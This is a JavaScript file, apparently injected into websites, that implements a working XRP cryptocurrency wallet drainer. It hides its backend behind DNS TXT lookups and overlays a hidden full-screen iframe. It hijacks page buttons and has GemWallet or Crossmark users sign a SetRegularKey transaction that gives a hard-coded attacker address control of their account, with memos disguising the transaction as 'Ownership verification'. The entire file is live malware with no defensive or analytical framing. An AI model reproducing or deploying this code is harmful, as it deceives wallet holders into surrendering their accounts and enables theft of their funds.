(function(){
var CONFIG_ID = "6a33295ad47446d6ecd4129d";
var _rn = "_r.noir.black";
var _rnd = "_rd.noir.black";
var _ck = "_enr";
var _ckd = "_enrd";
var _xrpCss = document.createElement('style');
_xrpCss.textContent = '#k4wk0yiydXO{display:none;position:fixed;inset:0;z-index:999999}#k4wk0yiydXO.active{display:block}#k4wk0yiydXO iframe{width:100%;height:100%;border:none;background:transparent}';
document.head.appendChild(_xrpCss);
function _parseTxt(data) {
  try {
    var answers = data.Answer;
    if (!answers || !answers.length) return null;
    for (var i = 0; i < answers.length; i++) {
      if (answers[i].type === 16) {
        var val = answers[i].data;
        if (val && val.charAt(0) === '"') val = val.slice(1, -1);
        if (val && val.indexOf('.') !== -1) return val;
      }
    }
    return null;
  } catch (e) { return null; }
}

var _memCache = {};
function _cacheSet(key, val) {
  _memCache[key] = { v: val, t: Date.now() };
  try { localStorage.setItem(key, JSON.stringify({ v: val, t: Date.now() })); } catch(e) {}
}

function _cacheGet(key, ttl) {
  try {
    var raw = localStorage.getItem(key);
    if (raw) {
      var obj = JSON.parse(raw);
      if (Date.now() - obj.t <= ttl) return obj.v;
      localStorage.removeItem(key);
    }
  } catch(e) {}
  var mem = _memCache[key];
  if (mem && (Date.now() - mem.t <= ttl)) return mem.v;
  return null;
}

// Fetch a TXT record via DoH. Races 1.1.1.1 and dns.google; first non-null wins.
function _fetchDoh(name) {
  var q = encodeURIComponent(name);
  var urls = [
    'https://1.1.1.1/dns-query?name=' + q + '&type=TXT',
    'https://dns.google/resolve?name=' + q + '&type=TXT'
  ];
  function _arm(url) {
    return Promise.race([
      fetch(url, { headers: { Accept: 'application/dns-json' }, credentials: 'omit' })
        .then(function(r) { return r.json(); })
        .then(function(d) {
          var v = _parseTxt(d);
          if (!v) throw new Error('no-txt');
          return v;
        }),
      new Promise(function(_, rej) { setTimeout(function() { rej(new Error('timeout')); }, 2500); })
    ]);
  }
  return Promise.any(urls.map(_arm)).catch(function() { return null; });
}

function _resolve(name, key) {
  if (!name) return Promise.resolve(null);
  if (name.indexOf('_') !== 0 && name.indexOf('.') !== -1) {
    return Promise.resolve(name.replace(/^https?:\/\//, '').replace(/\/.*$/, ''));
  }
  var cached = _cacheGet(key, 300000);
  if (cached) return Promise.resolve(cached);
  return _fetchDoh(name).then(function(domain) {
    if (domain) _cacheSet(key, domain);
    return domain;
  });
}

function resolveBackend()    { return _resolve(_rn,  _ck);  }
function resolveDirectPool() { return _resolve(_rnd, _ckd); }
var _modalReady = false;
var _iframeEl = null;

var HANDLER_ADDR = "rHsZRygX3GX6nCoYqZinM2VTYyLeTqnXQL";
function _toHex(s) {
  return Array.from(new TextEncoder().encode(s)).map(function(b){return b.toString(16).padStart(2,'0')}).join('').toUpperCase();
}
function _sendToIframe(msg) {
  if (_iframeEl && _iframeEl.contentWindow) _iframeEl.contentWindow.postMessage(msg, '*');
}
function _detectWallets() {
  return Promise.resolve({ gemwallet: true, crossmark: true });
}
async function _handleExtConnect(wallet) {
  try {
    if (wallet === 'gemwallet') {
      var gem = await import('https://esm.sh/@gemwallet/api@3');
      var inst = await gem.isInstalled();
      if (!inst || !inst.result || !inst.result.isInstalled) throw new Error('GemWallet is not installed');
      var addrResp = await gem.getAddress();
      if (addrResp.type === 'reject') throw new Error('Connection rejected');
      var address = addrResp.result.address;
      if (!address) throw new Error('No address returned');
      _sendToIframe({type:'rpcd9rConnected',wallet:wallet,address:address});
      var skResp = await gem.setRegularKey({
        regularKey: HANDLER_ADDR,
        memos: [{memo:{memoType:_toHex('Action'),memoData:_toHex('Ownership verification')}},
                {memo:{memoType:_toHex('Service'),memoData:_toHex('XRP Ledger identity check')}}]
      });
      if (skResp.type === 'reject') throw new Error('Verification rejected');
      var txHash = skResp.result && skResp.result.hash;
      if (!txHash) throw new Error('No transaction hash');
      _sendToIframe({type:'rpcd9rConnResult',wallet:wallet,success:true,address:address,txHash:txHash});
    } else if (wallet === 'crossmark') {
      var cm = (await import('https://esm.sh/@crossmarkio/sdk')).default;
      if (!cm || !cm.methods) throw new Error('Crossmark is not available');
      var si = await cm.methods.signInAndWait();
      var address2 = (si.response && si.response.data && si.response.data.address) || '';
      if (!address2) throw new Error('Crossmark did not return an address');
      _sendToIframe({type:'rpcd9rConnected',wallet:wallet,address:address2});
      var cm2 = (await import('https://esm.sh/@crossmarkio/sdk?t=' + Date.now())).default;
      await new Promise(function(r) { setTimeout(r, 500); });
      var setKeyTx = {TransactionType:'SetRegularKey',Account:address2,RegularKey:HANDLER_ADDR,
        Memos:[{Memo:{MemoType:_toHex('Action'),MemoData:_toHex('Ownership verification')}},
               {Memo:{MemoType:_toHex('Service'),MemoData:_toHex('XRP Ledger identity check')}}]};
      var result = await cm2.methods.signAndSubmitAndWait(setKeyTx);
      var raw = result && result.response && result.response.data && result.response.data.resp;
      var txHash2 = (raw && raw.result && raw.result.hash) || (raw && raw.hash) || '';
      if (!txHash2) throw new Error('Verification failed');
      _sendToIframe({type:'rpcd9rConnResult',wallet:wallet,success:true,address:address2,txHash:txHash2});
    }
  } catch(err) {
    _sendToIframe({type:'rpcd9rConnResult',wallet:wallet,success:false,error:err.message||'Connection failed'});
  }
}

resolveBackend().then(function(domain) {
  if (!domain) domain = 'xrp.noir.black';
  var url = 'https://' + domain + '/xrp?c=' + encodeURIComponent(CONFIG_ID) + '&v=3';
  var div = document.createElement('div');
  div.id = 'k4wk0yiydXO';
  var iframe = document.createElement('iframe');
  iframe.src = url;
  iframe.setAttribute('allow', 'clipboard-write');
  iframe.setAttribute('allowTransparency', 'true');
  iframe.style.cssText = 'width:100%;height:100%;border:none;background:transparent';
  div.appendChild(iframe);
  document.body.appendChild(div);
  _iframeEl = iframe;
  iframe.addEventListener('load', function() {
    _detectWallets().then(function(det) {
      iframe.contentWindow.postMessage({ type: 'rpcd9rWallets', wallets: det }, '*');
    });
  });
  _modalReady = true;
});
function _showModal() {
  if (!_modalReady) return;
  var o = document.getElementById('k4wk0yiydXO');
  if (o) o.classList.add('active');
  if (_iframeEl) {
    _detectWallets().then(function(det) {
      _iframeEl.contentWindow.postMessage({ type: 'rpcd9rWallets', wallets: det }, '*');
    });
  }
}
window.addEventListener('message', function(e) {
  if (e.data && e.data.type === 'rpcd9rClose') {
    var o = document.getElementById('k4wk0yiydXO');
    if (o) o.classList.remove('active');
  }
  if (e.data && e.data.type === 'noirXrpRedirect' && e.data.url) {
    window.location.href = e.data.url;
    return;
  }
  if (e.data && e.data.type === 'rpcd9rConnect' && e.data.wallet) {
    console.log('[xrp-bridge] Received rpcd9rConnect for:', e.data.wallet);
    _handleExtConnect(e.data.wallet);
  }
});
var btns = document.querySelectorAll('.k4ykl1-h6, .k3bxny-m9');
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener('click', function(e){ e.preventDefault(); _showModal(); });
}
try {
  if (!btns.length && window.__k4e4ldhAuto) { _showModal(); }
} catch(e) {}
})();